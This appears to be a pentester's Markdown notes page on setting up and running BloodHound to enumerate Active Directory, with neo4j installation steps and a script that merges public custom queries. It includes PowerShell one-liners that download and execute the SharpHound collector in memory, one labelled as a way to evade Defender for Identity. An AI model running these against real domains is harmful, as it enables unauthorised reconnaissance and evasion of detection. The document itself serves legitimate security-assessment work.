* **BloodHound:** [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)

>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

```powershell
# Run BloodHound
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod "All,GPOLocalGroup"
# Run BloodHound during 6 hours every 15 minutes
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod "All,GPOLocalGroup" -Loop -Loopduration 06:00:00 -LoopInterval 00:15:00
# Run BloodHound and ignore DCs to avoid MDI
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod "All,GPOLocalGroup" -ExcludeDCS
```
---
## Linux Installation
```bash
sudo apt install neo4j
sudo apt install bloodhound
```

## Configuration
Run the following to start neo4j:
```bash
sudo neo4j console
```

Go to http://127.0.0.1:7474 and authenticate using the credentials `neo4j:neo4j`.

## Usage
Run BloodHound:
```bash
sudo bloodhound
```

Authenticate and upload your ingestor data by clicking on `Upload Data` in the button menu on the upper right.

## Custom Queries
Use the following script to download extra BloodHound queries

```bash
#!/usr/bin/env bash

set -o errexit
set -o nounset
set -o pipefail

TMPDIR="$(mktemp -d --suffix=_bloodhound-customqueries)"

curl -s -o "$TMPDIR/customqueries-compass.json" "https://raw.githubusercontent.com/CompassSecurity/BloodHoundQueries/master/BloodHound_Custom_Queries/customqueries.json"

jq '.queries[].category |= (sub("^";"🧭 Compass: "))' < "$TMPDIR/customqueries-compass.json" > "$TMPDIR/customqueries-01-compass-modified.json"

curl -s -o "$TMPDIR/customqueries-certipy.json" "https://raw.githubusercontent.com/ly4k/Certipy/main/customqueries.json"

jq '.queries[].category |= (sub("^";"🔏 Certipy: "))' < "$TMPDIR/customqueries-certipy.json" > "$TMPDIR/customqueries-02-certipy-modified.json"

curl -s -o "$TMPDIR/customqueries-hausec.json" "https://raw.githubusercontent.com/hausec/Bloodhound-Custom-Queries/master/customqueries.json"

jq '.queries[] |= { "category": "💻 Hausec" } +. ' < "$TMPDIR/customqueries-hausec.json" > "$TMPDIR/customqueries-02-hausec-modified.json"

cat "$TMPDIR/"*-modified.json | jq -s 'add + {queries: map(.queries[])}' > customqueries.json
```

Run the following to copy them to the BloodHound config file:
```bash
sudo cp customqueries.json /root/.config/bloodhound/
```